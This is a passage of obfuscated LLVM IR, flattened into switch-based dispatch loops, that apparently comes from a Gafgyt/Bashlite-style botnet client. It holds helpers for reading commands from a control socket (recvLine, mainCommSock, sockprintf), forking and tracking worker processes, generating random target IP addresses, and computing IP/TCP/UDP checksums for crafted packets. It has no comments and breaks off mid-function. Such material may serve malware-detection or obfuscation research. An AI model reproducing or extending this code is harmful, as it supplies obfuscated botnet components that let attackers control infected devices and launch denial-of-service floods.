  %16 = load i64, i64* %3, align 8
  %17 = shl i64 %16, 4
  %18 = load i8*, i8** %2, align 8
  %19 = getelementptr inbounds i8, i8* %18, i32 1
  store i8* %19, i8** %2, align 8
  %20 = load i8, i8* %18, align 1
  %21 = zext i8 %20 to i64
  %22 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %21
  %23 = load i64, i64* %22, align 8
  %24 = or i64 %17, %23
  store i64 %24, i64* %3, align 8
  store i32 -1452167491, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i64, i64* %3, align 8
  ret i64 %26

loopEnd:                                          ; preds = %15, %13, %10, %4, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1564122634, i32* %switchVar
  %.reg2mem12 = alloca i1
  %.reg2mem14 = alloca i1
  %.reg2mem16 = alloca i1
  %.reg2mem18 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar7 = load i32, i32* %switchVar
  switch i32 %switchVar7, label %switchDefault [
    i32 -1564122634, label %NodeBlock5
    i32 1818083764, label %NodeBlock
    i32 -1544955983, label %LeafBlock3
    i32 2066962810, label %LeafBlock1
    i32 666038070, label %LeafBlock
    i32 54078471, label %14
    i32 -483975047, label %18
    i32 1666982285, label %25
    i32 2104586869, label %31
    i32 -454290296, label %38
    i32 -1962215962, label %39
    i32 1591134096, label %42
    i32 -1541232888, label %48
    i32 -76069625, label %56
    i32 -303110399, label %NewDefault
    i32 103300438, label %59
    i32 416976261, label %70
    i32 -2146051167, label %78
    i32 956204074, label %81
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem
  %Pivot6 = icmp slt i32 %.reload11, 42
  %9 = select i1 %Pivot6, i32 666038070, i32 1818083764
  store i32 %9, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload9, 63
  %10 = select i1 %Pivot, i32 2066962810, i32 -1544955983
  store i32 %10, i32* %switchVar
  br label %loopEnd

LeafBlock3:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf4 = icmp eq i32 %.reload, 63
  %11 = select i1 %SwitchLeaf4, i32 1591134096, i32 -303110399
  store i32 %11, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload8 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload8, 42
  %12 = select i1 %SwitchLeaf2, i32 -483975047, i32 -303110399
  store i32 %12, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload10, 0
  %13 = select i1 %SwitchLeaf, i32 54078471, i32 -303110399
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  store i32 %17, i32* %3, align 4
  store i32 956204074, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = getelementptr inbounds i8, i8* %19, i64 1
  %21 = load i8*, i8** %5, align 8
  %22 = call i32 @wildString(i8* %20, i8* %21)
  %23 = icmp ne i32 %22, 0
  %24 = select i1 %23, i32 1666982285, i32 -1962215962
  store i32 %24, i32* %switchVar
  store i1 true, i1* %.reg2mem14
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i8*, i8** %5, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp ne i32 %28, 0
  %30 = select i1 %29, i32 2104586869, i32 -454290296
  store i32 %30, i32* %switchVar
  store i1 false, i1* %.reg2mem12
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i8*, i8** %4, align 8
  %33 = load i8*, i8** %5, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = call i32 @wildString(i8* %32, i8* %34)
  %36 = icmp ne i32 %35, 0
  %37 = xor i1 %36, true
  store i32 -454290296, i32* %switchVar
  store i1 %37, i1* %.reg2mem12
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload13 = load i1, i1* %.reg2mem12
  store i32 -1962215962, i32* %switchVar
  store i1 %.reload13, i1* %.reg2mem14
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %.reload15 = load i1, i1* %.reg2mem14
  %40 = xor i1 %.reload15, true
  %41 = zext i1 %40 to i32
  store i32 %41, i32* %3, align 4
  store i32 956204074, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp ne i32 %45, 0
  %47 = select i1 %46, i32 -1541232888, i32 -76069625
  store i32 %47, i32* %switchVar
  store i1 false, i1* %.reg2mem16
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i8*, i8** %4, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 1
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = call i32 @wildString(i8* %50, i8* %52)
  %54 = icmp ne i32 %53, 0
  %55 = xor i1 %54, true
  store i32 -76069625, i32* %switchVar
  store i1 %55, i1* %.reg2mem16
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %.reload17 = load i1, i1* %.reg2mem16
  %57 = xor i1 %.reload17, true
  %58 = zext i1 %57 to i32
  store i32 %58, i32* %3, align 4
  store i32 956204074, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 103300438, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8*, i8** %4, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = call i32 @toupper(i32 %62) #10
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = call i32 @toupper(i32 %66) #10
  %68 = icmp eq i32 %63, %67
  %69 = select i1 %68, i32 416976261, i32 -2146051167
  store i32 %69, i32* %switchVar
  store i1 false, i1* %.reg2mem18
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i8*, i8** %4, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 1
  %73 = load i8*, i8** %5, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 1
  %75 = call i32 @wildString(i8* %72, i8* %74)
  %76 = icmp ne i32 %75, 0
  %77 = xor i1 %76, true
  store i32 -2146051167, i32* %switchVar
  store i1 %77, i1* %.reg2mem18
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %.reload19 = load i1, i1* %.reg2mem18
  %79 = xor i1 %.reload19, true
  %80 = zext i1 %79 to i32
  store i32 %80, i32* %3, align 4
  store i32 956204074, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i32, i32* %3, align 4
  ret i32 %82

loopEnd:                                          ; preds = %78, %70, %59, %NewDefault, %56, %48, %42, %39, %38, %31, %25, %18, %14, %LeafBlock, %LeafBlock1, %LeafBlock3, %NodeBlock, %NodeBlock5, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %switchVar = alloca i32
  store i32 630193737, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 630193737, label %3
    i32 1056746996, label %8
    i32 -472623548, label %17
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:3:                                      ; preds = %loopEntry
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  %7 = select i1 %6, i32 1056746996, i32 -472623548
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8*, i8** %2, align 8
  %10 = load i8, i8* %9, align 1
  %11 = zext i8 %10 to i32
  %12 = call i32 @toupper(i32 %11) #10
  %13 = trunc i32 %12 to i8
  %14 = load i8*, i8** %2, align 8
  store i8 %13, i8* %14, align 1
  %15 = load i8*, i8** %2, align 8
  %16 = getelementptr inbounds i8, i8* %15, i32 1
  store i8* %16, i8** %2, align 8
  store i32 630193737, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %8, %3, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @RandString(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -773972702, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -773972702, label %6
    i32 -206710049, label %11
    i32 -178237629, label %20
    i32 647361927, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  %10 = select i1 %9, i32 -206710049, i32 647361927
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @rand_cmwc()
  %13 = urem i32 %12, 26
  %14 = add i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  store i8 %15, i8* %19, align 1
  store i32 -178237629, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %5, align 4
  store i32 -773972702, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %20, %11, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  %switchVar = alloca i32
  store i32 -1828358193, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1828358193, label %24
    i32 2053057052, label %33
    i32 303491443, label %50
    i32 1253880527, label %51
    i32 -773101427, label %55
    i32 -1322921944, label %60
    i32 762832436, label %69
    i32 -499584381, label %86
    i32 169605279, label %89
    i32 -735522169, label %90
    i32 1176884943, label %91
    i32 -1123417066, label %93
    i32 -841935497, label %98
    i32 2084391976, label %103
    i32 -1507897703, label %105
    i32 1195865630, label %113
    i32 1016854864, label %114
    i32 118766096, label %117
    i32 1581764036, label %120
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  store i32 2053057052, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  %49 = select i1 %48, i32 303491443, i32 1176884943
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 1253880527, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %13, align 4
  %53 = icmp slt i32 %52, 10
  %54 = select i1 %53, i32 -773101427, i32 -735522169
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* @mainCommSock, align 4
  %57 = call i32 (i32, i8*, ...) @sockprintf(i32 %56, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i32 0, i32 0))
  %58 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %58, align 8
  %59 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %59, align 8
  store i32 -1322921944, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %62 = getelementptr inbounds [16 x i64], [16 x i64]* %61, i64 0, i64 0
  %63 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %62) #2, !srcloc !3
  %64 = extractvalue { i64, i64* } %63, 0
  %65 = extractvalue { i64, i64* } %63, 1
  %66 = trunc i64 %64 to i32
  store i32 %66, i32* %14, align 4
  %67 = ptrtoint i64* %65 to i64
  %68 = trunc i64 %67 to i32
  store i32 %68, i32* %15, align 4
  store i32 762832436, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %5, align 4
  %71 = srem i32 %70, 64
  %72 = zext i32 %71 to i64
  %73 = shl i64 1, %72
  %74 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %75 = load i32, i32* %5, align 4
  %76 = sdiv i32 %75, 64
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [16 x i64], [16 x i64]* %74, i64 0, i64 %77
  %79 = load i64, i64* %78, align 8
  %80 = or i64 %79, %73
  store i64 %80, i64* %78, align 8
  %81 = load i32, i32* %5, align 4
  %82 = add nsw i32 %81, 1
  %83 = call i32 @select(i32 %82, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %83, i32* %12, align 4
  %84 = icmp sle i32 %83, 0
  %85 = select i1 %84, i32 -499584381, i32 169605279
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %13, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %13, align 4
  store i32 1253880527, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 -735522169, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 1176884943, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  %92 = load i8*, i8** %6, align 8
  store i8* %92, i8** %17, align 8
  store i32 -1123417066, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %7, align 4
  %95 = add nsw i32 %94, -1
  store i32 %95, i32* %7, align 4
  %96 = icmp sgt i32 %94, 1
  %97 = select i1 %96, i32 -841935497, i32 118766096
  store i32 %97, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* @mainCommSock, align 4
  %100 = call i64 @recv(i32 %99, i8* %16, i64 1, i32 0)
  %101 = icmp ne i64 %100, 1
  %102 = select i1 %101, i32 2084391976, i32 -1507897703
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8*, i8** %17, align 8
  store i8 0, i8* %104, align 1
  store i32 -1, i32* %4, align 4
  store i32 1581764036, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i8, i8* %16, align 1
  %107 = load i8*, i8** %17, align 8
  %108 = getelementptr inbounds i8, i8* %107, i32 1
  store i8* %108, i8** %17, align 8
  store i8 %106, i8* %107, align 1
  %109 = load i8, i8* %16, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp eq i32 %110, 10
  %112 = select i1 %111, i32 1195865630, i32 1016854864
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  store i32 118766096, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %18, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %18, align 4
  store i32 -1123417066, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8*, i8** %17, align 8
  store i8 0, i8* %118, align 1
  %119 = load i32, i32* %18, align 4
  store i32 %119, i32* %4, align 4
  store i32 1581764036, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %4, align 4
  ret i32 %121

loopEnd:                                          ; preds = %117, %114, %113, %105, %103, %98, %93, %91, %90, %89, %86, %69, %60, %55, %51, %50, %33, %24, %switchDefault
  br label %loopEntry
}

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -695707639, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -695707639, label %first
    i32 -143594377, label %9
    i32 293258732, label %11
    i32 1757863041, label %19
    i32 -1752867602, label %26
    i32 -1783245482, label %36
    i32 752129882, label %39
    i32 1110029364, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ule i32 %.reload, 0
  %8 = select i1 %7, i32 -143594377, i32 293258732
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  store i32 %10, i32* %1, align 4
  store i32 1110029364, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i64, i64* @numpids, align 8
  %13 = add i64 %12, 1
  store i64 %13, i64* @numpids, align 8
  %14 = load i64, i64* @numpids, align 8
  %15 = add i64 %14, 1
  %16 = mul i64 %15, 4
  %17 = call noalias i8* @malloc(i64 %16) #2
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 1757863041, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = zext i32 %20 to i64
  %22 = load i64, i64* @numpids, align 8
  %23 = sub i64 %22, 1
  %24 = icmp ult i64 %21, %23
  %25 = select i1 %24, i32 -1752867602, i32 752129882
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32*, i32** @pids, align 8
  %28 = load i32, i32* %4, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds i32, i32* %27, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32*, i32** %3, align 8
  %33 = load i32, i32* %4, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  store i32 %31, i32* %35, align 4
  store i32 -1783245482, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = add i32 %37, 1
  store i32 %38, i32* %4, align 4
  store i32 1757863041, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %2, align 4
  %41 = load i32*, i32** %3, align 8
  %42 = load i64, i64* @numpids, align 8
  %43 = sub i64 %42, 1
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  store i32 %40, i32* %44, align 4
  %45 = load i32*, i32** @pids, align 8
  %46 = bitcast i32* %45 to i8*
  call void @free(i8* %46) #2
  %47 = load i32*, i32** %3, align 8
  store i32* %47, i32** @pids, align 8
  %48 = load i32, i32* %2, align 4
  store i32 %48, i32* %1, align 4
  store i32 1110029364, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %39, %36, %26, %19, %11, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 -270580644, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -270580644, label %6
    i32 1114432769, label %10
    i32 2099372716, label %19
    i32 1707220366, label %23
    i32 1896200751, label %30
    i32 -1956713910, label %31
    i32 -996602236, label %36
    i32 -33732091, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  %9 = select i1 %8, i32 1114432769, i32 2099372716
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sub nsw i32 %17, 2
  store i32 %18, i32* %4, align 4
  store i32 -270580644, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 0
  %22 = select i1 %21, i32 1707220366, i32 1896200751
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i16*, i16** %3, align 8
  %25 = bitcast i16* %24 to i8*
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i64
  %28 = load i64, i64* %5, align 8
  %29 = add i64 %28, %27
  store i64 %29, i64* %5, align 8
  store i32 1896200751, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 -1956713910, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = icmp ne i64 %33, 0
  %35 = select i1 %34, i32 -996602236, i32 -33732091
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i64, i64* %5, align 8
  %38 = and i64 %37, 65535
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = add i64 %38, %40
  store i64 %41, i64* %5, align 8
  store i32 -1956713910, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 %43, -1
  %45 = trunc i64 %44 to i16
  ret i16 %45

loopEnd:                                          ; preds = %36, %31, %30, %23, %19, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcp_udp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  %switchVar = alloca i32
  store i32 1073205259, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1073205259, label %23
    i32 -289331645, label %27
    i32 -450451074, label %37
    i32 -733574725, label %41
    i32 242885252, label %48
    i32 1866023001, label %79
    i32 1286520347, label %84
    i32 951464578, label %90
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  %26 = select i1 %25, i32 -289331645, i32 -450451074
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
